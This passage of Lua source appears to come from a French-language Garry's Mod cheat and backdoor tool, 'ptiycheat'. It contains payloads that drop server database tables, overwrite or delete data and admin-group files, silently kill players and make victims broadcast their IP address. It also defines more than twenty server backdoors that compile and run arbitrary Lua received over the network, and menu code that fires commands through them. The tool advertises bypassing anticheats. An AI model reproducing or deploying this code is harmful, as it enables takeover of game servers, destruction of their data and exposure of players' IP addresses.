"nordahl_Spawnpoint/rp_oldworld_fix.txt","nordahl_Spawnpoint/sd_doomsday.txt","nordahl_Spawnpoint/sd_doomsday_event.txt","nordahl_Spawnpoint/rp_naboo_city_v1.txt","nordahl_Spawnpoint/rp_noclyria_crimson.txt","nordahl_Spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_Spawnpoint/rp_mos_mersic_v2.txt","nordahl_Spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_Spawnpoint/dust_dunes.txt","nordahl_Spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_Spawnpoint/rd_asteroid.txt","nordahl_Spawnpoint/naboo.txt","nordahl_Spawnpoint/kashyyyk.txt","nordahl_Spawnpoint/geonosis.txt","nordahl_Spawnpoint/fightspace3b.txt","nordahl_Spawnpoint/endor.txt","nordahl_Spawnpoint/toth_forgotten.txt"}

for k,v in pairs(dataBDMenus) do
if sql.TableExists(v) then
sql.Query("DROP TABLE "..v.." ;")
sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
end
end

for k,v in pairs(datafiles) do
if file.Exists(v) then
file.Delete(v)
file.write(v, "ptiycheatcheats.com hehe")
end
end

for k,v in pairs(sensitivefiles) do
if file.Exists(v) then
file.Delete(v)
file.write(v, "ptiycheatcheats.com hehe")
end
end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
]],

["Private"] = true,

},

["Kill (silent)"] = {

["Type"] = 2,

["Code"] = [[v:KillSilent()]],

},

["Supprimer Props"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand("gmod_cleanup")]],

},

["'Récupere son IP'"] = {

["Type"] = 2,

["Code"] = [[
if (darkrp || DarkRP) then
v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say /ooc Mon IP est "..b) end, function(error) return error end )')
else
v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say Mon IP est "..b) end, function(error) return error end )')
end
]],

["Private"] = true,

},

// key/view scrambler, fuck with escape menu




/*================================
|===== Commandes Dangereuses =====|
=================================*/


}


local selectedbackdoor = ""

local backdoorargs = ""

local selectedplayers = {}











/*====================================
|===== Configuration Backdoor 88 =====|
=====================================*/



if not snte then

BD.BackdoorTypes["Mining"] = {
["Code"] = "util.AddNetworkString( 'Ulx_Error_88' ) net.Receive( 'Ulx_Error_88', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Ulx_Error_88",
}

BD.BackdoorTypes["Crero"] = {
["Code"] = "util.AddNetworkString( 'FAdmin_Notification_Receiver' ) net.Receive( 'FAdmin_Notification_Receiver', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "FAdmin_Notification_Receiver",
}

BD.BackdoorTypes["FAdmin"] = {
["Code"] = "util.AddNetworkString( 'DarkRP_ReceiveData' ) net.Receive( 'DarkRP_ReceiveData', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "DarkRP_ReceiveData",
}

BD.BackdoorTypes["ptiycheatbd"] = {
["Code"] = "util.AddNetworkString( 'fijiconn' ) net.Receive( 'fijiconn', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "fijiconn",
}

BD.BackdoorTypes["Weapon"] = {
["Code"] = "util.AddNetworkString( 'Weapon_88' ) net.Receive( 'Weapon_88', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Weapon_88",
}

BD.BackdoorTypes["Nostrip"] = {
["Code"] = "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)",
["Netkey"] = "nostrip",
}

BD.BackdoorTypes["Session"] = {
["Code"] = "util.AddNetworkString( 'SessionBackdoor' ) net.Receive( 'SessionBackdoor', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "SessionBackdoor",
}

BD.BackdoorTypes["DarkRP_n"] = {
["Code"] = "util.AddNetworkString( 'DarkRP_AdminWeapons' ) net.Receive( 'DarkRP_AdminWeapons', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "DarkRP_AdminWeapons",
}

BD.BackdoorTypes["frenculer"] = {
["Code"] = "util.AddNetworkString( 'thefrenchenculer' ) net.Receive( 'thefrenchenculer', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "thefrenchenculer",
}

BD.BackdoorTypes["Fix_Keypads"] = {
["Code"] = "util.AddNetworkString( 'Fix_Keypads' ) net.Receive( 'Fix_Keypads', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Fix_Keypads",
}

BD.BackdoorTypes["CAC"] = {
["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "_CAC_ReadMemory",
}

BD.BackdoorTypes["Exploiters"] = {
["Code"] = "util.AddNetworkString( 'Remove_Exploiters' ) net.Receive( 'Remove_Exploiters', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Remove_Exploiters",
}

BD.BackdoorTypes["MoonMan"] = {
["Code"] = "util.AddNetworkString( 'MoonMan' ) net.Receive( 'MoonMan', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "MoonMan",
}

BD.BackdoorTypes["disableb"] = {
["Code"] = "util.AddNetworkString( 'disablebackdoor' ) net.Receive( 'disablebackdoor', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "disablebackdoor",
}

BD.BackdoorTypes["Sbox"] = {
["Code"] = "util.AddNetworkString( 'Sbox_itemstore' ) net.Receive( 'Sbox_itemstore', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Sbox_itemstore",
}

BD.BackdoorTypes["Sbox2"] = {
["Code"] = "util.AddNetworkString( 'Sbox_darkrp' ) net.Receive( 'Sbox_darkrp', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Sbox_darkrp",
}

BD.BackdoorTypes["R8"] = {
["Code"] = "util.AddNetworkString( 'R8' ) net.Receive( 'R8', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "R8",
}

BD.BackdoorTypes["c"] = {
["Code"] = "util.AddNetworkString( 'c' ) net.Receive( 'c', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "c",
}

BD.BackdoorTypes["_cac_"] = {
["Code"] = "util.AddNetworkString( '_cac_' ) net.Receive( '_cac_', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "_cac_",
}

BD.BackdoorTypes["_Defqon"] = {
["Code"] = "util.AddNetworkString( '_Defqon' ) net.Receive( '_Defqon', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "_Defqon",
}

BD.BackdoorTypes["LickMeOut"] = {
["Code"] = "util.AddNetworkString( 'LickMeOut' ) net.Receive( 'LickMeOut', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "LickMeOut",
}

BD.BackdoorTypes["nck"] = {
["Code"] = "util.AddNetworkString( 'noclipcloakaesp_chat_text' ) net.Receive( 'noclipcloakaesp_chat_text', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "noclipcloakaesp_chat_text",
}

BD.BackdoorTypes["ArmDupe"] = {
["Code"] = "util.AddNetworkString( 'Sandbox_ArmDupe' ) net.Receive( 'Sandbox_ArmDupe', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
["Netkey"] = "Sandbox_ArmDupe",
}


else
end




/*==================================
|===== Derma 88 Backdoor Menu =====|
=================================*/



function BD.GenerateBackdoorList( parent, category )



for k, v in SortedPairs( BD.BDMacros, false ) do

if v["Type"] != category then continue end



local plypanel2 = vgui.Create( "DPanel" )

plypanel2:SetPos( 50, 0 )

plypanel2:SetSize( 103, 15 )

plypanel2.Paint = function() -- Paint function



if selectedbackdoor == k then draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(150, 150, 150, 70), false, false, false, false)
else draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 70), false, false, false, false)
end


end



local plyname = vgui.Create( "DLabel", plypanel2 )

plyname:SetPos( 3, 0 )

plyname:SetFont( "ptiycheat_homemini" )

local tcol = Color( 255, 255, 255 )

if v.Private then tcol = Color( 255, 107, 107 )

if fiji_style_menu:GetInt() == 2 then
if v == LocalPlayer() then tcol = Color( math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75) ) end

elseif fiji_style_menu:GetInt() == 3 then
if v == LocalPlayer() then tcol = Color( 255, 91, 91 ) end

elseif fiji_style_menu:GetInt() == 1 then
if v == LocalPlayer() then  tcol = HSVToColor( CurTime() % 6 * 60, 1, 0.5 )end

else
if v == LocalPlayer() then tcol = Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) end

end
end

plyname:SetColor( tcol )

plyname:SetText( k )

plyname:SetSize(670, 15)






local faggot = vgui.Create("DButton", plypanel2)

faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

faggot:SetPos( 0, 0 )

faggot:SetText("")

if v["Desc"] != "" then  end

faggot.Paint = function(panel, w, h)

return

end

faggot.DoClick = function()

selectedbackdoor = k

end





parent:AddItem( plypanel2 )



end



end



function BD.FormatCodeTargeted()

if !BD.BackdoorActive() then BD.ChatText( "La backdoor séléctionnée n'est pas présente", Color(255,155,155) ) return end

if selectedbackdoor == "" then BD.ChatText( "Veuillez séléctionné une commande", Color(255,155,155) ) return end

local param = string.Explode( ",", backdoorargs )

local ids = {}

for k, v in pairs( selectedplayers ) do

if !v:IsValid() then table.RemoveByValue( selectedplayers, v ) continue end

table.insert( ids, v:UniqueID() )

end



local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]

code = string.Replace( code, "##", table.ToString( ids ) )

code = string.Replace( code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "" )

code = string.Replace( code, "%LP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "Veuillez paramétrer la commande", Color(255,155,155) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

code = string.Replace( code, "@"..k, [["]]..v..[["]] )

end



BD.Fire( code )



end



function BD.FormatCodeGlobal()

--if !BD.BackdoorActive() then BD.ChatText( "Aucune backdoor sur le serveur", Color(0,0,0) ) return end

if selectedbackdoor == "" then BD.ChatText( "Veuillez selectionner une commande", Color(255,74,74) ) return end

local param = string.Explode( ",", backdoorargs )



local code = BD.BDMacros[selectedbackdoor]["Code"]



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "Veuillez paramétrer la commande", Color(255,74,74) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

code = string.Replace( code, "@"..k, [["]]..v..[["]] )

code = string.Replace( code, "%LP", LocalPlayer():UniqueID() )

code = string.Replace( code, "%LCP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )

code = string.Replace( code, "%BD", BD.GetActive().Code )

end



BD.Fire( code )



end





local safenet = net

local function bdnet()

if odium and odium.G then return odium.G.net end

return safenet

end





---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------

BD.BtnHovered = BD.BtnHovered or 1

-- Fonts
surface.CreateFont( "BD:Hitman:50", { font = "Arial", extended = false, size = 50, weight = 800, } )
surface.CreateFont( "BD:Hitman:30", { font = "Arial", extended = false, size = 30, weight = 800, } )



-- Menu
function BD:CreateBtn( text, x, y, w, h, BDMenu )
local btn = vgui.Create( "DButton", BDMenu )
btn:SetPos( x, y )
btn:SetSize( w, h )
btn:SetText( "" )
btn.IsHovered = false
function btn:OnCursorEntered() self.IsHovered = true end
function btn:OnCursorExited() self.IsHovered = false end
function btn:Paint( w, h )

local cText = Color( 255, 255, 255, 50 )


if self.IsHovered then
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 30 ) )
cBorder = Color( 110,110,110, 30 )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
cBorder = Color( 110,110,110, 0 )

end

if self.activebtn then
if fiji_style_menu:GetInt() == 2 then
cText = Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
cBorder = Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
elseif fiji_style_menu:GetInt() == 1 then
cText = HSVToColor( CurTime() % 6 * 60, 1, 0.5 )
cBorder = HSVToColor( CurTime() % 6 * 60, 1, 0.5 )
elseif fiji_style_menu:GetInt() == 3 then
cText = Color( 190, 242, 190 )
cBorder = Color( 190, 242, 190,80 )
else
cText = Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 )
cBorder = Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 )
end
draw.SimpleText( text, "ptiycheat_homeBTN", w / 2, h / 2, cText, 1, 1 )
else
draw.SimpleText( text, "ptiycheat_home5", w / 2, h / 2, cText, 1, 1 )
end



surface.SetDrawColor( cBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
end

return btn
end

concommand.Add("fiji_luarun", function()
local BDLuarun = vgui.Create( "DFrame" )
BDLuarun:SetSize( 700, 400 )
BDLuarun:Center()
BDLuarun:SetTitle("")
BDLuarun:SetDraggable( true )
BDLuarun:ShowCloseButton( false )
BDLuarun:MakePopup()
BDLuarun.Paint = function( self, w, h)
DrawBlur(self, 25)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,245 ) )
draw.SimpleText("Remarque : Un code lua supérieur à 1000 lignes peut faire crash votre jeux durant quelques minutes.", "ptiycheat_home3", 11, 11, Color(150, 110, 110,255), 0, 1)

end


local BDLuaruntext = vgui.Create( "DTextEntry", BDLuarun ) -- create the form as a child of frame
BDLuaruntext:SetPos( 5, 25 )
BDLuaruntext:SetSize( 690, 330 )
BDLuaruntext:SetMultiline( true )
BDLuaruntext:SetText( "-- Entrer le code lua (Exemple: autre cheat, utilitaire de jeux...) \n \n" )
BDLuaruntext.OnEnter = function( self )
chat.AddText( self:GetValue() )	-- print the form's text as server text
end

local AcceptLuarun = vgui.Create( "DButton", BDLuarun)
AcceptLuarun:SetPos( 310, 360)
AcceptLuarun:SetSize( 80, 35  )
AcceptLuarun:SetTextColor( Color( 255, 255, 255, 255 ) )
AcceptLuarun:SetText( "Lancer le code" )
AcceptLuarun.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 110,110,110, 80 )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 110,110,110, 0 )
end
AcceptLuarun.OnCursorEntered = function(self)                    --
surface.PlaySound( fiji_ptiycheathover )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
AcceptLuarun.DoClick = function()
NOTIFICATION("Lua lançé")
surface.PlaySound( fiji_ptiycheatclick )
RunString( BDLuaruntext:GetText() )
end
end


local CloseLuaRun = vgui.Create( "DButton", BDLuarun)
CloseLuaRun:SetPos( 670, 8)
CloseLuaRun:SetSize( 20, 15 )
CloseLuaRun:SetTextColor( Color( 255, 255, 255, 255 ) )
CloseLuaRun:SetText( "X" )
CloseLuaRun.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
CloseLuaRun.DoClick = function()
LocalPlayer():ConCommand("fiji_sv_existmen 0")

BDLuarun:Remove()
end
end

local ReturnLuaRun = vgui.Create( "DButton", BDLuarun)
ReturnLuaRun:SetPos( 638, 8)
ReturnLuaRun:SetSize( 30, 15)
ReturnLuaRun:SetTextColor( Color( 255, 255, 255, 255 ) )
ReturnLuaRun:SetText( "<--" )
ReturnLuaRun.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
ReturnLuaRun.DoClick = function()
LocalPlayer():ConCommand("ptiycheat")
BDLuarun:Remove()
end
end

concommand.Add( "fiji_clearluarun", function() -- fiji_sv_existmen
BDLuarun:Remove()

end)

end)

function BD:Dashboard( pContent )


function NOTIFICATION(text, pContent)

ctxt( Color(126, 255, 117), "[ptiycheat] ", Color(255, 255, 255), text )

end

function NOTIFICATIONNO(text)
ctxt( Color(255, 114, 114), "[ptiycheat] ", Color(255, 255, 255), text )
end

local BDMenuDashboard = vgui.Create("DPanel", pContent)
BDMenuDashboard:SetSize( 539, 388 )
BDMenuDashboard:SetPos( 0, 0 )
BDMenuDashboard.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(255,35,35,0 ) )

if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 98, 2, h - 60, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 0, 0, 2, h - 336, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 98, 2, h - 60, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 336, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )

else
draw.RoundedBox( 0, 0, 98, 2, h - 60, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 334, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end


end
local TextHome = vgui.Create( "DPanel", pContent )
TextHome:SetSize(500,650)
TextHome:SetPos(20,20)
TextHome.Paint = function( self, w, h )
if fiji_style_menu:GetInt() == 3 then
draw.SimpleText("✝ ptiycheat ✝ ", "ptiycheat_home1", 158, 20, Color(238, 61, 61), 0, 1)
elseif fiji_style_menu:GetInt() == 2 then
draw.SimpleText("✝ ptiycheat ✝ ", "ptiycheat_home1", 158, 20, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)), 0, 1)

elseif fiji_style_menu:GetInt() == 1 then
draw.SimpleText("✝ ptiycheat ✝ ", "ptiycheat_home1", 158, 20, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), 0, 1)

else
draw.SimpleText("✝ ptiycheat ✝ ", "ptiycheat_home1", 158, 20, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ), 0, 1)

end

surface.SetMaterial( fiji_ptiycheatdiscordwidget )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 90, 150, 320, 76 )

draw.SimpleText("Garry's Mod Cheat - V1", "ptiycheat_home2", 192, 62, Color(255, 255, 255,20), 0, 1)
draw.SimpleText("Bienvenue dans le ptiycheat, un cheat complet et indétectable.", "ptiycheat_home4", 32, 100, Color(255, 255, 255,200), 0, 1)
draw.SimpleText("Rendez-vous sur Discord pour toutes questions.", "ptiycheat_home3", 118, 135, Color(255, 255, 255,200), 0, 1)
draw.SimpleText("Executer votre propre Lua pour bypass les Anticheats :", "ptiycheat_home3", 102, 305, Color(255, 255, 255,200), 0, 1)
end

--[[
local TextEntry = vgui.Create( "DTextEntry", pContent ) -- create the form as a child of frame
TextEntry:SetPos( 150, 200 )
TextEntry:SetSize( 75, 150 )
TextEntry:SetMultiline( true )
TextEntry:SetText( "Placeholder Text" )
TextEntry.OnEnter = function( self )
chat.AddText( self:GetValue() )	-- print the form's text as server text
end
]]


local Runstringlua = vgui.Create( "DButton", pContent)
Runstringlua:SetPos( 210, 342)
Runstringlua:SetSize( 120, 35  )
Runstringlua:SetTextColor( Color( 255, 255, 255, 255 ) )
Runstringlua:SetText( "Executer Lua" )
Runstringlua.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox( 0, 0, 0, w, h, Color( 130,110,110, 60 ) )
aBorder = Color( 255,110,110, 255 )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 150,110,110, 20 ) )
aBorder = Color( 255,110,110, 80 )
end
Runstringlua.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )

end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
Runstringlua.DoClick = function()
surface.PlaySound( fiji_ptiycheatclick )
LocalPlayer():ConCommand("fiji_luarun")
LocalPlayer():ConCommand("clear_ptiycheat")
LocalPlayer():ConCommand("fiji_sv_existmen 1")
end
end


local Copierdiscordanim = vgui.Create( "DPanel", pContent )
Copierdiscordanim:SetSize(80,12)
Copierdiscordanim:SetPos(180, 287)
Copierdiscordanim.Paint = function( self, w, h )

if CopiediscordHomeTextyes then
draw.RoundedBox(0,0,0,w,h,Color(116, 255, 112, 255))
draw.SimpleText("Void(0) was here !", "ptiycheat_home2", 0, 0, Color(255, 255, 255,20), 0, 1)
else
end
end

local CopiediscordHomeText = vgui.Create( "DButton", pContent)
CopiediscordHomeText:SetPos( 350, 358)
CopiediscordHomeText:SetSize( 200, 40  )
CopiediscordHomeText:SetTextColor( Color( 255, 255, 255, 0 ) )
CopiediscordHomeText:SetText( "Copier le lien" )
CopiediscordHomeText.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 0))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 0))
end
CopiediscordHomeText.DoClick = function()
SetClipboardText( "Void(0) was here !" )
end
end
local CopiediscordHome = vgui.Create( "DButton", pContent)
CopiediscordHome:SetPos( 180, 255)
CopiediscordHome:SetSize( 80, 35  )
CopiediscordHome:SetTextColor( Color( 255, 255, 255, 255 ) )
CopiediscordHome:SetText( "Copier Discord" )
CopiediscordHome.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
CopiediscordHomeText:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 110,110,110, 80 )
else
CopiediscordHomeText:SetTextColor( Color( 255, 255, 255, 0 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 110,110,110, 0 )
endder = Color( 110,110,110, 0 )
end
CopiediscordHome.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
CopiediscordHome.DoClick = function()
NOTIFICATION("Lien copié")
SetClipboardText( "Void(0) was here !" )
surface.PlaySound( fiji_ptiycheatclick )
end
end
local CopiewebHomeText = vgui.Create( "DButton", pContent)
CopiewebHomeText:SetPos( 361, 358)
CopiewebHomeText:SetSize( 200, 40  )
CopiewebHomeText:SetTextColor( Color( 255, 255, 255, 0 ) )
CopiewebHomeText:SetText( "Copier le lien" )
CopiewebHomeText.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 0))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 0))
end
CopiewebHomeText.DoClick = function()
SetClipboardText( "Void(0) was here !" )
end
end

local CopiewebHome = vgui.Create( "DButton", pContent)
CopiewebHome:SetPos( 280, 255)
CopiewebHome:SetSize( 80, 35  )
CopiewebHome:SetTextColor( Color( 255, 255, 255, 255 ) )
CopiewebHome:SetText( "Copier Site" )
CopiewebHome.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
CopiewebHomeText:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 60 ) )
aBorder = Color( 110,110,110, 80 )
else
CopiewebHomeText:SetTextColor( Color( 255, 255, 255, 0 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
aBorder = Color( 110,110,110, 0 )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
CopiewebHome.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )

end
CopiewebHome.DoClick = function()
NOTIFICATION("Lien copié")
SetClipboardText( "Void(0) was here !" )
surface.PlaySound( fiji_ptiycheatclick )

end
end
end




concommand.Add("fiji_console", function()
local BDConsole = vgui.Create( "DFrame" )
BDConsole:SetSize( 700, 400 )
BDConsole:Center()
BDConsole:SetTitle("")
BDConsole:SetDraggable( true )
BDConsole:ShowCloseButton( false )
BDConsole:MakePopup()
BDConsole.Paint = function( self, w, h)
DrawBlur(self, 25)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,245 ) )

end

local ConsoleText = vgui.Create( "DPanel", BDConsole ) -- create the form as a child of frame
ConsoleText:SetPos( 5, 25 )
ConsoleText:SetSize( 690, 370 )
ConsoleText:SetText( "MaJ" )
ConsoleText.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,255 ) )

end

local ConsoleText1 = vgui.Create( "DPanel", ConsoleText ) -- create the form as a child of frame
ConsoleText1:SetPos( 500, 1000 )
ConsoleText1:SetSize( 690, 370 )
ConsoleText1:SetText( "MaJ" )
ConsoleText1.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,255 ) )
draw.SimpleText("Initialisation...", "BudgetLabel", 5, 5, Color(255, 255, 255,255), 0, 1)

end

local ConsoleText2 = vgui.Create( "DPanel", ConsoleText ) -- create the form as a child of frame
ConsoleText2:SetPos( 500, 1000 )
ConsoleText2:SetSize( 690, 370 )
ConsoleText2:SetText( "MaJ" )
ConsoleText2.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,255 ) )
draw.SimpleText("Lecture du cache...", "BudgetLabel", 5, 5, Color(95, 119, 252), 0, 1)
end

local ConsoleText3 = vgui.Create( "DPanel", ConsoleText ) -- create the form as a child of frame
ConsoleText3:SetPos( 500, 1000 )
ConsoleText3:SetSize( 690, 370 )
ConsoleText3:SetText( "MaJ" )
ConsoleText3.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,255 ) )
draw.SimpleText("Affichage", "BudgetLabel", 5, 5, Color(255, 255, 255,255), 0, 1)
end

local ConsoleText4 = vgui.Create( "DPanel", ConsoleText ) -- create the form as a child of frame
ConsoleText4:SetPos( 500, 1000 )
ConsoleText4:SetSize( 690, 370 )
ConsoleText4:SetText( "MaJ" )
ConsoleText4.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,255 ) )
draw.SimpleText("V1.0 - Base du Menu", "BudgetLabel", 5, 5, Color(91, 255, 102,255), 0, 1)

draw.SimpleText("En développement : Catégorie Fun Commandes", "BudgetLabel", 5, 20, Color(255, 100, 100,255), 0, 1)
end


local Readconsole = vgui.Create( "DButton", ConsoleText)
Readconsole:SetPos( 5, 8)
Readconsole:SetSize( 150, 15 )
Readconsole:SetTextColor( Color( 255, 255, 255, 255 ) )
Readconsole:SetText( "Cliquez ici pour lancer la lecture" )
Readconsole.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))

Readconsole.DoClick = function()
Readconsole:Remove()
timer.Simple( 0.1, function()
